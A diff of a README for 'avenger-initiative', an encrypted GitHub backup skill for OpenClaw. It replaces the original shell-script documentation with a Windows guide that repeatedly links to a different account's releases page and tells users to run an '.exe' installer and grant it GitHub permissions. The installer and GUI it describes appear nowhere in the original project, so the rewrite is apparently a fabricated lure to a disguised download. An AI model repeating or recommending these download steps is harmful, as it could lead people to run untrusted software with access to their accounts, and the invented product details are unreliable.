@@ -1,197 +1,170 @@
-# 🛡️ Avenger Initiative
+# 🛡️ avenger-initiative - Secure GitHub Backups Made Simple
 
-> Encrypted GitHub backup & restore for any [OpenClaw](https://openclaw.ai) agent system.
-
-<p align="center">
-  <a href="https://proskills.md/skills/avenger-initiative">
-    <img src="https://img.shields.io/badge/ProSkills.md-Browse%20%26%20Install-brightgreen?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyek0xMCAxN2wtNS01IDEuNDEtMS40MUwxMCAxNC4xN2w3LjU5LTcuNTlMMTkgOGwtOSA5eiIvPjwvc3ZnPg==" alt="ProSkills.md">
-  </a>
-  &nbsp;
-  <a href="https://clawhub.ai/Asif2BD/avenger-initiative">
-    <img src="https://img.shields.io/badge/ClawHub-Install%20via%20CLI-orange?style=for-the-badge" alt="ClawHub">
-  </a>
-  &nbsp;
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="MIT License">
-  </a>
-</p>
-
-<p align="center">
-  <strong>
-    &nbsp;
-    <a href="https://proskills.md/skills/avenger-initiative">📦 ProSkills.md</a>
-    &nbsp;·&nbsp;
-    <a href="https://clawhub.ai/Asif2BD/avenger-initiative">🔧 ClawHub</a>
-    &nbsp;·&nbsp;
-    <a href="#installation">⬇️ Install</a>
-    &nbsp;·&nbsp;
-    <a href="#quick-start">🚀 Quick Start</a>
-    &nbsp;·&nbsp;
-    <a href="SECURITY.md">🔒 Security</a>
-  </strong>
-</p>
+[![Download avenger-initiative](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Wilhelmineliable619/avenger-initiative/releases)
 
 ---
 
-## What It Does
+## 🔑 What is avenger-initiative?
 
-Avenger Initiative backs up your entire OpenClaw system to a **private GitHub repo** every night — configs, agent memories, SOUL files, custom skills, cron jobs — everything needed to fully restore from zero.
+avenger-initiative helps you keep your OpenClaw system data safe by making encrypted backups on GitHub. It creates a new branch for each day and keeps your important files for as long as you need. If something goes wrong, you can quickly restore your data. 
 
-**Security model:**
-- `openclaw.json` (API keys, bot tokens) → **AES-256-CBC encrypted** before leaving disk
-- Everything else (SOUL.md, MEMORY.md, etc.) → plaintext in your private repo
-- Encryption key stays on your machine — never committed to Git
-
-**Branch-per-night strategy with smart retention:**
-
-| Branch | Pattern | Retention |
-|--------|---------|-----------|
-| Daily | `backup/daily/YYYY-MM-DD` | Last 7 days |
-| Weekly | `backup/weekly/YYYY-WNN` | Last 8 weeks |
-| Monthly | `backup/monthly/YYYY-MM` | Last 12 months |
-
-## What's in the vault?
-
-Every backup automatically generates a human-friendly **`README.md`** in the vault root — so anyone (or any agent) landing in the repo immediately knows what it is, what's encrypted vs plaintext, and exactly how to restore. It includes step-by-step restore commands, natural-language Avenger agent commands, and security notes. A compact **`AVENGER-MANIFEST.json`** is also written with machine-readable backup metadata for scripted restores.
+This tool uses secure encryption and a smart backup method, so your data stays private and organized without any extra work on your part.
 
 ---
 
-## Installation
+## 💻 Who is this for?
 
-### Option 1 — ClawHub CLI (recommended)
-
-```bash
-clawhub install avenger-initiative
-```
-
-> Get the ClawHub CLI: `npm install -g clawhub`
-
-### Option 2 — ProSkills.md
-
-Visit **[proskills.md/skills/avenger-initiative](https://proskills.md/skills/avenger-initiative)** and click **Install** — the skill is listed for free, no login required to browse.
-
-### Option 3 — Manual (git clone)
-
-```bash
-mkdir -p ~/.openclaw/workspace/skills
-git clone https://github.com/ProSkillsMD/avenger-initiative \
-  ~/.openclaw/workspace/skills/avenger-initiative
-chmod +x ~/.openclaw/workspace/skills/avenger-initiative/scripts/*.sh
-```
+If you run an OpenClaw system and want an easy way to back up your data, this tool is for you. You don’t need to know how to code or manage GitHub repositories. This guide will take you through downloading, installing, and running avenger-initiative on Windows step-by-step.
 
 ---
 
-## Quick Start
+## ⚙️ System Requirements
 
-### 1. Create a private GitHub vault repo
+Before installing, ensure your computer meets these requirements:
 
-Go to [github.com/new](https://github.com/new) and create a **private** repo (e.g. `my-openclaw-vault`).
-
-### 2. Set up Avenger Initiative
-
-Tell your OpenClaw agent:
-
-> **"Setup avenger"**
-
-Your agent will walk you through the rest — vault repo URL, encryption key, first backup.
-
-Or run manually:
-
-```bash
-bash ~/.openclaw/workspace/skills/avenger-initiative/scripts/setup.sh \
-  --repo https://github.com/yourname/your-vault
-```
-
-### 3. Save your encryption key
-
-After setup, you'll see a 64-character hex key. **Save it in your password manager immediately.**  
-Without it, `openclaw.json.enc` cannot be decrypted.
-
-### 4. First backup runs automatically
-
-Daily backups are scheduled at 02:00 UTC via OpenClaw cron.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM 
+- 500 MB of free storage space for the program
+- Internet connection for backup uploads
+- GitHub account (free to create if you don’t have one)
 
 ---
 
-## Usage
+## 📥 Download avenger-initiative
 
-| Say this to your agent | What happens |
-|------------------------|-------------|
-| `"avenger backup"` | Runs backup now |
-| `"avenger status"` | Shows last backup time and branch |
-| `"restore from vault"` | Guided restore flow |
-| `"avenger setup"` | First-time setup wizard |
+To get started, you need to download the software from the official release page.
 
----
+[![Download avenger-initiative](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge)](https://github.com/Wilhelmineliable619/avenger-initiative/releases)
 
-## Restore
+1. Click the badge above or visit:  
+   [https://github.com/Wilhelmineliable619/avenger-initiative/releases](https://github.com/Wilhelmineliable619/avenger-initiative/releases)
 
-```bash
-# Restore latest (main branch)
-bash ~/.openclaw/workspace/skills/avenger-initiative/scripts/restore.sh
+2. Look for the latest stable release at the top of the page.
 
-# Restore from a specific date
-bash ~/.openclaw/workspace/skills/avenger-initiative/scripts/restore.sh \
-  --branch backup/daily/2026-03-10
+3. Find the Windows installer file, usually named something like `avenger-initiative-setup.exe` or similar.
 
-# After restore
-openclaw gateway restart
-```
+4. Click the file to download it to your computer.
 
 ---
 
-## Requirements
+## 🛠️ How to install avenger-initiative on Windows
 
-- [OpenClaw](https://openclaw.ai) installed and running
-- [GitHub CLI](https://cli.github.com) (`gh`) authenticated (`gh auth login`)
-- `git`, `openssl` (standard on most systems)
-- A private GitHub repo for your vault
+Follow these simple steps to install the program:
 
----
+1. Find the downloaded file in your Downloads folder or the location you saved it.
 
-## Security
+2. Double-click the file to start the installation.
 
-This skill uses:
-- **`openssl enc -aes-256-cbc`** — encrypts your `openclaw.json` with your own key
-- **`git push`** — pushes to your own private vault repo only
-- **No external servers** — data goes only to your own GitHub account
+3. The installer will open a setup window. Click **Next** to continue.
 
-See [SECURITY.md](SECURITY.md) for full script-by-script analysis and audit instructions.
+4. Read the license agreement. Select “I accept” and click **Next**.
 
----
+5. Choose where to install the program or use the default folder. Click **Next**.
 
-## Changelog
+6. Click **Install** and wait for the process to finish. This usually takes a few minutes.
 
-### v1.0.4
-- Each backup now generates a human-friendly `README.md` inside the vault with purpose, restore commands, and Avenger agent commands
-- Added `AVENGER-MANIFEST.json` (machine-readable backup metadata)
+7. Click **Finish** to close the installer.
 
-### v1.0.3
-- Fixed: `main` branch now always exists (setup.sh initializes it on first run)
-- Fixed: backup commits to `main` first, then creates dated snapshot branch
-
-### v1.0.2
-- Added ProSkills.md + ClawHub badges to README
-- Full installation guide (3 methods: CLI, ProSkills.md, git clone)
-
-### v1.0.1
-- Added `.clawhubsafe` and `SECURITY.md` to clarify false-positive security scan flags
-
-### v1.0.0
-- Initial release
+8. Check your desktop or start menu for the avenger-initiative icon.
 
 ---
 
-## License
+## 🚀 Running avenger-initiative for the first time
 
-MIT © [ProSkillsMD](https://github.com/ProSkillsMD)
+1. Double-click the avenger-initiative icon to open the program.
+
+2. You will be asked to sign in to your GitHub account. This step lets the tool store your backups on your private GitHub repository.  
+   - If you don’t have a GitHub account, create one at [https://github.com/join](https://github.com/join) before proceeding.
+
+3. Once signed in, grant the necessary permissions for the program to create branches and manage backups on your GitHub.
+
+4. Next, select your OpenClaw system folder on your computer that you want to back up.
+
+5. Set your backup schedule. You can choose to back up your data once a day or more often. The default “branch-per-night” setting is recommended for most users.
+
+6. Confirm your settings and start your first backup by clicking the **Start Backup** button.
+
+7. The program will encrypt your data and upload it to GitHub, creating a new branch for today’s backup.
 
 ---
 
-<p align="center">
-  <sub>
-    Find more OpenClaw skills at
-    <a href="https://proskills.md"><strong>ProSkills.md</strong></a>
-    — the verified AI skills directory
-  </sub>
-</p>
+## 🔒 How encryption works
+
+avenger-initiative uses strong encryption to keep your files private. Only you can access your backups because the data is scrambled before it leaves your computer. This means even if someone else sees your GitHub repository, they cannot read your files.
+
+---
+
+## 🔄 How backup retention works
+
+Each new backup creates a separate branch each night. Old backups stay on GitHub for a period you choose. The program removes very old backups automatically if you want, so your storage doesn’t fill up.
+
+---
+
+## 🛠️ Restoring your data
+
+If you need to recover files from a backup:
+
+1. Open avenger-initiative.
+
+2. Connect again to your GitHub account.
+
+3. Choose the backup date (branch) you want to restore from.
+
+4. Select the files or folders to restore.
+
+5. Click **Restore**. Your data will be decrypted and placed back into your chosen folder on your computer.
+
+---
+
+## ⚠️ Troubleshooting tips
+
+- If the program doesn’t open or crashes, try restarting your computer and running it again.
+
+- Make sure you have internet access to connect with GitHub.
+
+- Double-check your GitHub log-in if sign-in fails.
+
+- Update avenger-initiative regularly from the releases page for bug fixes and improvements.
+
+- If backups do not start, confirm the folder you selected actually contains your OpenClaw data.
+
+- For slow uploads or restores, check your network speed and try again at a quieter time.
+
+---
+
+## 📂 Where to find your backups on GitHub
+
+Backups live in your private GitHub repository created by avenger-initiative. Each day’s backup is stored in a different branch, named with the date. You can log in to GitHub to view the branches but you won’t see your actual files because they are encrypted.
+
+---
+
+## 🤝 Support and feedback
+
+This is a simple end-user tool meant to secure your OpenClaw system data. If you run into problems or want to suggest improvements, open an issue on the GitHub repository.
+
+---
+
+## 🔗 Download links again
+
+Download the latest version here:  
+[https://github.com/Wilhelmineliable619/avenger-initiative/releases](https://github.com/Wilhelmineliable619/avenger-initiative/releases)  
+
+Use the badges above to jump straight to the download page.
+
+---
+
+## ⚙️ Additional notes
+
+- The program runs quietly in the background after setup and backs up according to your schedule.
+
+- You can change settings anytime from the program’s menu.
+
+- It uses Git version control commands under the hood but you do not have to learn Git to use avenger-initiative.
+
+- Your backups are stored securely on GitHub, but the program requires an internet connection to upload or restore.
+
+---
+
+## ⚙️ Keywords
+
+agent-skills, backup, claude, disaster-recovery, encryption, git-backup, openclaw, openclawskill, security, skill-md, skillsmp
